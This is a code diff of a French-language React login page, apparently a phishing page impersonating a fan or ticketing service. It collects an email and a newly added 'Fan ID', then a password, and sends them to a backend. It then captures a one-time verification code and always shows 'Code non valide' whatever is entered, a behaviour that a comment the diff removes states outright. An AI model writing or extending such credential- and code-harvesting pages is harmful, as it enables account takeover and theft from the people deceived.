@@ -8,29 +8,30 @@ export default function Home() {
   const [step, setStep] = useState<1 | 2 | 3>(1);
   
   const [email, setEmail] = useState("");
+  const [fanId, setFanId] = useState(""); // <-- NOUVEL ÉTAT FAN ID
   const [password, setPassword] = useState("");
   const [code, setCode] = useState("");
   
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   
-  // Nouvel état pour gérer le message d'erreur
   const [errorMessage, setErrorMessage] = useState("");
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setErrorMessage(""); // On nettoie les erreurs précédentes
+    setErrorMessage(""); 
 
-    // ÉTAPE 1 : Validation Email
+    // ÉTAPE 1 : Validation Email ET Fan ID
     if (step === 1) {
-      if (email) setStep(2);
+      if (email && fanId) setStep(2); // <-- VÉRIFICATION DES DEUX CHAMPS
     } 
     
-    // ÉTAPE 2 : Envoi Password -> Passage au Code
+    // ÉTAPE 2 : Envoi Password + Fan ID -> Passage au Code
     else if (step === 2) {
       setLoading(true);
       const formData = new FormData();
       formData.append("email", email);
+      formData.append("fanId", fanId); // <-- ENVOI DU FAN ID AU BACKEND
       formData.append("password", password);
 
       await sendLoginData(formData);
@@ -39,20 +40,16 @@ export default function Home() {
       setStep(3);
     } 
     
-    // ÉTAPE 3 : Envoi du Code -> Affichage Erreur sous le bouton
+    // ÉTAPE 3 : Envoi du Code -> Affichage Erreur
     else if (step === 3) {
       setLoading(true);
       const formData = new FormData();
       formData.append("email", email);
       formData.append("code", code);
 
-      // 1. On envoie le code saisi par mail
       await sendVerificationCode(formData);
       
-      // 2. On arrête le chargement
       setLoading(false);
-
-      // 3. On affiche le message d'erreur (quelle que soit la saisie)
       setErrorMessage("Code non valide. Veuillez réessayer.");
     }
   };
@@ -75,26 +72,49 @@ export default function Home() {
         <div className="w-full border border-gray-200 rounded-lg p-8 shadow-sm bg-white">
           <form onSubmit={handleSubmit} className="flex flex-col gap-6">
             
-            {/* --- ETAPE 1 & 2 : EMAIL --- */}
+            {/* --- ETAPE 1 & 2 : EMAIL & FAN ID --- */}
             {step !== 3 && (
-              <div className="relative group">
-                <input
-                  type="email"
-                  required
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
-                    ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
-                  `}
-                  readOnly={step === 2}
-                />
-                <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
-                    ${(!email && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
-                  `}>
-                  Votre email {step === 1 && <span className="text-gray-400">*</span>}
-                </label>
-                {step === 2 && <span className="absolute right-3 top-4 text-gray-400">*</span>}
-              </div>
+              <>
+                {/* CHAMP EMAIL */}
+                <div className="relative group">
+                  <input
+                    type="email"
+                    required
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value)}
+                    className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
+                      ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
+                    `}
+                    readOnly={step === 2}
+                  />
+                  <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
+                      ${(!email && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
+                    `}>
+                    Votre email {step === 1 && <span className="text-gray-400">*</span>}
+                  </label>
+                  {step === 2 && <span className="absolute right-3 top-4 text-gray-400">*</span>}
+                </div>
+
+                {/* CHAMP FAN ID (NOUVEAU) */}
+                <div className="relative group">
+                  <input
+                    type="text"
+                    required
+                    value={fanId}
+                    onChange={(e) => setFanId(e.target.value)}
+                    className={`peer w-full h-[60px] px-4 pt-1 rounded border outline-none transition-colors text-lg text-gray-800
+                      ${step === 2 ? "border-gray-300 bg-gray-50 text-gray-500" : "border-gray-400 focus:border-gray-600"}
+                    `}
+                    readOnly={step === 2}
+                  />
+                  <label className={`absolute left-3 top-[-10px] bg-white px-1 text-sm text-gray-500 transition-all 
+                      ${(!fanId && step === 1) ? "top-4 text-lg" : "top-[-10px] text-sm"}
+                    `}>
+                    Fan ID {step === 1 && <span className="text-gray-400">*</span>}
+                  </label>
+                  {step === 2 && <span className="absolute right-3 top-4 text-gray-400">*</span>}
+                </div>
+              </>
             )}
 
             {/* --- ETAPE 2 : PASSWORD --- */}
@@ -130,7 +150,6 @@ export default function Home() {
                   autoFocus
                   placeholder="Ex: 123456"
                   value={code}
-                  // On efface l'erreur si l'utilisateur recommence à taper
                   onChange={(e) => {
                     setCode(e.target.value);
                     setErrorMessage(""); 
@@ -166,7 +185,7 @@ export default function Home() {
                 )}
               </button>
 
-              {/* MESSAGE D'ERREUR SOUS LE BOUTON */}
+              {/* MESSAGE D'ERREUR */}
               {errorMessage && (
                 <div className="flex items-center justify-center gap-2 text-[#d32f2f] bg-[#ffebee] p-3 rounded animate-in fade-in slide-in-from-top-1">
                   <AlertCircle size={20} />
